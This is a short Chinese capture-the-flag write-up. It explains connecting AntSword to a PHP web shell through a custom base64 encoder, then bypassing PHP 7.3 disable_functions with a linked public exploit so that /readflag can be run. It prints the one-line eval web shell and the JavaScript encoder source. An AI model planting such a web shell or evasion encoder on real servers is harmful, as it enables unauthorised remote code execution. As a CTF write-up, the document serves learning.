需要编辑一下蚁剑的编码格式,就可以连上shell了

/**
 * php::b64pass编码器
 * Create at: 2018/10/11 21:40:45
 *
 * 把所有 POST 参数都进行了 base64 编码
 *
 * 适用shell: 
 *
 * <?php @eval(base64_decode($_POST['ant']));?>
 * 
 */

'use strict';

module.exports = (pwd, data) => {
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = new Buffer(data['_']).toString('base64');
  data[pwd] = new Buffer(`eval(base64_decode($_POST[${randomID}]));die();`).toString('base64');
  delete data['_'];
  return data;
}

连上shell之后查看根目录，有flag和readflag

直接读取flag发现没有权限，很明显题目就是想执行readflag去读flag

查看phpinfo

似乎把所有的执行命令的函数都给ban了，应该就是要绕过disable_functions去执行readflag

去网上搜PHP7.3绕过disable_functions可以搜到现成的exp

https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php

太长了就不贴了

现在/var/tmp 目录下建一个shell.php,复制以上exp

最后base64一下 include(‘/var/tmp/shell.php’)就可以了
